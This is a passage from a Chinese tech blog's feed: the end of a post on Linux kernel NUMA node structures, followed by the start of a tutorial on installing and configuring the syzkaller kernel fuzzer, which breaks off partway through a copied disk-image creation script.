中物理页的总大小</h3><p>该字段记录了节点上<strong>包括空洞在内</strong>的页帧为单位的该节点内存的总长度</p><h3 id="node-id：node-的标号"><a href="#node-id：node-的标号" class="headerlink" title="node_id：node 的标号"></a>node_id：node 的标号</h3><p>该字段记录了该节点在系统中的标号，从 0 开始</p><h2 id="node-存储方式：全局数组-node-data"><a href="#node-存储方式：全局数组-node-data" class="headerlink" title="node 存储方式：全局数组 node_data[]"></a>node 存储方式：全局数组 node_data[]</h2><p>在 <code>/arch/x86/mm/numa.c</code> 中定义了一个 pglist_data 数组，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">node_data</span>[<span class="title">MAX_NUMNODES</span>] __<span class="title">read_mostly</span>;</span></span><br><span class="line">EXPORT_SYMBOL(node_data);</span><br></pre></td></tr></table></figure><p>该数组中保存了系统中的<strong>所有的节点</strong></p><p>由此，我们最终得到这样一张架构图：</p><blockquote><p>还是偷的图，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/28/KcHILforOySi8YR.png" alt="image.png"></p><blockquote><p>我们可以使用 <code>numactl</code> 工具来查看系统中的节点信息，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">numactl --hardware</span></span><br><span class="line">available: 1 nodes (0)</span><br><span class="line">node 0 cpus: 0 1 2 3</span><br><span class="line">node 0 size: 11942 MB</span><br><span class="line">node 0 free: 4464 MB</span><br><span class="line">node distances:</span><br><span class="line">node   0 </span><br><span class="line">  0:  10 </span><br></pre></td></tr></table></figure><blockquote><p>笔者的机器比较弱，只有一个节点</p></blockquote></blockquote><h2 id="node-状态：全局数组-node-states"><a href="#node-状态：全局数组-node-states" class="headerlink" title="node 状态：全局数组 node_states[]"></a>node 状态：全局数组 node_states[]</h2><p>在 <code>/mm/page_alloc.c</code> 中定义了一个全局数组 <code>node_states</code> 用以标识对应标号的节点的状态，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Array of node states.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">nodemask_t</span> node_states[NR_NODE_STATES] __read_mostly = &#123;</span><br><span class="line">    [N_POSSIBLE] = NODE_MASK_ALL,</span><br><span class="line">    [N_ONLINE] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_NUMA</span></span><br><span class="line">    [N_NORMAL_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">    [N_HIGH_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    [N_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line">    [N_CPU] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>    <span class="comment">/* NUMA */</span></span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(node_states);</span><br></pre></td></tr></table></figure><p>在这里的 <code>nodemask_t</code> 类型为一个<strong>位图</strong>类型，定义于 <code>/include/linux/nodemask.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="type">nodemask_t</span>;</span><br></pre></td></tr></table></figure><p>这个状态由一个枚举类型 <code>node_states</code> 定义，该枚举类型定义于 <code>/include/linux/nodemask.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 位掩码将为所有节点保存</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">node_states</span> &#123;</span></span><br><span class="line">    N_POSSIBLE,        <span class="comment">/* 节点在某个时刻是联机的 */</span></span><br><span class="line">    N_ONLINE,        <span class="comment">/* 节点是联机的 */</span></span><br><span class="line">    N_NORMAL_MEMORY,    <span class="comment">/* 节点有着普通的内存 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">    N_HIGH_MEMORY,        <span class="comment">/* 节点有着普通或高端内存 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    N_HIGH_MEMORY = N_NORMAL_MEMORY,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    N_MEMORY,        <span class="comment">/* 节点有着内存(普通，高端，可移动) */</span></span><br><span class="line">    N_CPU,        <span class="comment">/* 节点有着一个或多个 cpu */</span></span><br><span class="line">    N_GENERIC_INITIATOR,    <span class="comment">/* 节点有一个或多个 Generic Initiators */</span></span><br><span class="line">    NR_NODE_STATES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;无内鬼，来点内存条&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x01】syzkaller - I：使用 syzkaller 进行漏洞挖掘</title>
    <link href="http://blog.arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/"/>
    <id>http://blog.arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/</id>
    <published>2021-11-23T19:09:11.000Z</published>
    <updated>2022-07-03T20:07:26.670Z</updated>
    
    <content type="html"><![CDATA[<p>尝试遍历所有的世界线</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>syzkaller 是由 Google 开发的一个十分强大的针对内核的 fuzzer，自其面世以来已经帮助全世界的内核安全研究员发现了数量惊人的内核漏洞</p><p>本篇文章中笔者将简述 syzkaller 的使用方法</p><h1 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01.环境配置"></a>0x01.环境配置</h1><blockquote><p>这里参照官方文档进行配置： <a href="https://github.com/google/syzkaller">https://github.com/google/syzkaller</a></p><p>笔者本地环境：Ubuntu 21.04</p></blockquote><p><strong>在安装之前请确保你的电脑具有足够的运行内存与存储空间！</strong>（笔者的2G阿里云学生机就被搞炸了</p><p>要使用 syzkaller 进行漏洞挖掘，我们需要：</p><ul><li><code>Go compiler and syzkaller itself</code></li><li><code>C compiler with coverage support</code></li><li><code>Linux kernel with coverage additions</code></li><li><code>Virtual machine or a physical device</code></li></ul><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev clang clang-format</span></span><br></pre></td></tr></table></figure><h2 id="配置-golang-环境"><a href="#配置-golang-环境" class="headerlink" title="配置 golang 环境"></a>配置 golang 环境</h2><p>首先配置 golang 环境，可以参照<a href="https://golang.org/doc/install">官方文档</a>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xf go1.14.2.linux-amd64.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mv</span> go goroot</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> gopath</span></span><br></pre></td></tr></table></figure><p>在 <code>/etc/profile</code> 中写入如下配置，重启，这里需要注意的是 <code>YourGoPath</code><strong>应当替换为你实际存放 go 的路径</strong>，在上一步的终端中输入 <code>pwd</code> 后将其值替换到下方</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOPATH=YourGoPath/gopath</span><br><span class="line"><span class="built_in">export</span> GOROOT=YourGoPath/goroot</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOPATH</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><h2 id="编译-syzkaller"><a href="#编译-syzkaller" class="headerlink" title="编译 syzkaller"></a>编译 syzkaller</h2><p>安装 syzkaller 本体</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go get -u -d github.com/google/syzkaller/prog</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> gopath/src/github.com/google/syzkaller/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure><h2 id="编译目标内核"><a href="#编译目标内核" class="headerlink" title="编译目标内核"></a>编译目标内核</h2><p>从镜像站随便拉一个版本的源码过来就行，笔者这里拉了一个 5.11 版本的内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.11.tar.gz</span></span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -zxvf linux-5.11.tar.gz</span> </span><br></pre></td></tr></table></figure><p>然后执行下面这两条指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> defconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> kvm_guest.config</span></span><br></pre></td></tr></table></figure><p>对于老版本内核，应当为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> defconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> kvmconfig</span></span><br></pre></td></tr></table></figure><p>接下来编辑 <code>.config</code> 文件，在其末尾添加如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br></pre></td></tr></table></figure><p>接下来开始编译内核，这个时候可以简单开一局你喜欢的游戏慢慢等待（笑）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> olddefconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> -j64</span></span><br></pre></td></tr></table></figure><p>这里笔者还遇到一个问题，**笔者的 gcc 版本太高了…**于是编译的时候又出现了这个错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc1: error: ‘-fcf-protection’ is not compatible with this target</span><br></pre></td></tr></table></figure><p><strong>切换回官方推荐的 gcc8 后重新进行编译</strong></p><blockquote><p>笔者<del>向生活妥协了，</del>暂时没找到高版本 gcc 在这个配置下能够成功编译的方法</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-8 gcc-8-multilib</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install g++-8 g++-8-multilib</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo update-alternatives --install /usr/bin/gcc gcc  /usr/bin/gcc-8 1</span></span><br></pre></td></tr></table></figure><p>出现下面这行就标志着编译完成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure><p>编译出来的 bzImage 在 <code>arch/x86/boot/bzImage</code>，vmlinux 则就在源码根目录下，这两个文件前者是压缩后的内核后者是原始内核文件</p><h2 id="配置-ext4-硬盘镜像文件"><a href="#配置-ext4-硬盘镜像文件" class="headerlink" title="配置 ext4 硬盘镜像文件"></a>配置 ext4 硬盘镜像文件</h2><p>这里我们使用 <code>debootstrap</code> 来创建ext4硬盘镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> image</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> image</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> +x create-image.sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./create-image.sh</span></span><br></pre></td></tr></table></figure><blockquote><p>wget 的这一步<strong>需要翻墙</strong>（<code>raw.githubusercontent.com</code> 在国内似乎是被墙了，总之笔者记忆里从没成功在不翻墙的情况下成功上去过），若嫌麻烦可以直接 copy 笔者已经下好的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># Copyright 2016 syzkaller project authors. All rights reserved.</span></span><br><span class="line"><span class="comment"># Use of this source code is governed by Apache 2 LICENSE that can be found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create-image.sh creates a minimal Debian Linux image suitable for syzkaller.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a minimal Debian distribution in a directory.</span></span><br><span class="line">DIR=<span class="built_in">chroot</span></span><br><span class="line">PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,debian-ports-archive-keyring</span><br><span class="line"></span><br><span class="line"><span class="comment"># If ADD_PACKAGE is not defined as an external environment variable, use our default packages</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$&#123;ADD_PACKAGE+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line"> ADD_PACKAGE=<span class="string">&quot;make,sysbench,git,vim,tmux,usbutils,tcpdump&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables affected by options</span></span><br><span class="line">ARCH=$(<span class="built_in">uname</span> -m)</span><br><span class="line">RELEASE=stretch</span><br><span class="line">FEATURE=minimal</span><br><span class="line">SEEK=2047</span><br><span class="line">PERF=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display help function</span></span><br><span class="line"><span class="function"><span class="title">display_help</span></span>() &#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> [option...] &quot;</span> &gt;&amp;2</span><br><span class="line"> <span class="built_in">echo</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -a, --arch                 Set architecture&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -d, --distribution         Set on which debian distribution to create&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -f, --feature              Check what packages to install in the image, options are minimal, full&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -s, --seek                 Image size (MB), default 2048 (2G)&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -h, --help                 Display help message&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -p, --add-perf             Add perf support with this option enabled. Please set envrionment variable \$KERNEL at first&quot;</span></span><br><span class="line"> <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line"> <span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$#</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"> <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">     -h | --<span class="built_in">help</span>)</span><br><span class="line">         display_help</span><br><span class="line">         <span class="built_in">exit</span> 0</span><br><span class="line">         ;;</span><br><span class="line">     -a | --<span class="built_in">arch</span>)</span><br><span class="line">    ARCH=<span class="variable">$2</span></span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -d | --distribution)</span><br><span class="line">    RELEASE=<span class="variable">$2</span></span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -f | --feature)</span><br><span class="line">    FEATURE=<span class="variable">$2</span></span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -s | --seek)</span><br><span class="line">    SEEK=$((<span class="variable">$2</span> - <span class="number">1</span>))</span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -p | --add-perf)</span><br><span class="line">    PERF=<span class="literal">true</span></span><br><span class="line">         <span class="built_in">shift</span> 1</span><br><span class="line">         ;;</span><br><span class="line">     -*)</span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;Error: Unknown option: <span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">         <span class="built_in">exit</span> 1</span><br><span class="line">         ;;</span><br><span class="line">     *)  <span class="comment"># No more options</span></span><br><span class="line">         <span class="built_in">break</span></span><br><span class="line">         ;;</span><br><span class="line"> <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle cases where qemu and Debian use different arch names</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$ARCH</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line"> ppc64le)</span><br><span class="line">     DEBARCH=ppc64el</span><br><span class="line">     ;;</span><br><span class="line"> aarch64)</span><br><span class="line">     DEBARCH=arm64</span><br><span class="line">     ;;</span><br><span class="line"> arm)</span><br><span class="line">     DEBARCH=armel</span><br><span class="line">     ;;</span><br><span class="line"> x86_64)</span><br><span class="line">     DEBARCH=amd64</span><br><span class="line">     ;;</span><br><span class="line"> *)</span><br><span class="line">     DEBARCH=<span class="variable">$ARCH</span></span><br><span class="line">     ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Foreign architecture</span></span><br><span class="line"></span><br><span class="line">FOREIGN=<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$ARCH</span> != $(<span class="built_in">uname</span> -m) ]; <span class="keyword">then</span></span><br><span class="line"> <span class="comment"># i386 on an x86_64 host is exempted, as we can run i386 binaries natively</span></span><br><span class="line"> <span class="keyword">if</span> [ <span class="variable">$ARCH</span> != <span class="string">&quot;i386&quot;</span> -o $(<span class="built_in">uname</span> -m) != <span class="string">&quot;x86_64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">     FOREIGN=<span class="literal">true</span></span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> <span class="comment"># Check for according qemu static binary</span></span><br><span class="line"> <span class="keyword">if</span> ! <span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static; <span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;Please install qemu static binary for architecture <span class="variable">$ARCH</span> (package &#x27;qemu-user-static&#x27; on Debian/Ubuntu/Fedora)&quot;</span></span><br><span class="line">     <span class="built_in">exit</span> 1</span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"> <span class="comment"># Check for according binfmt entry</span></span><br><span class="line"> <span class="keyword">if</span> [ ! -r /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> ]; <span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;binfmt entry /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> does not exist&quot;</span></span><br><span class="line">     <span class="built_in">exit</span> 1</span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Double check KERNEL when PERF is enabled</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ] &amp;&amp; [ -z <span class="variable">$&#123;KERNEL+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;Please set KERNEL environment variable when PERF is enabled&quot;</span></span><br><span class="line"> <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If full feature is chosen, install more packages</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FEATURE</span> = <span class="string">&quot;full&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> PREINSTALL_PKGS=<span class="variable">$PREINSTALL_PKGS</span><span class="string">&quot;,&quot;</span><span class="variable">$ADD_PACKAGE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo 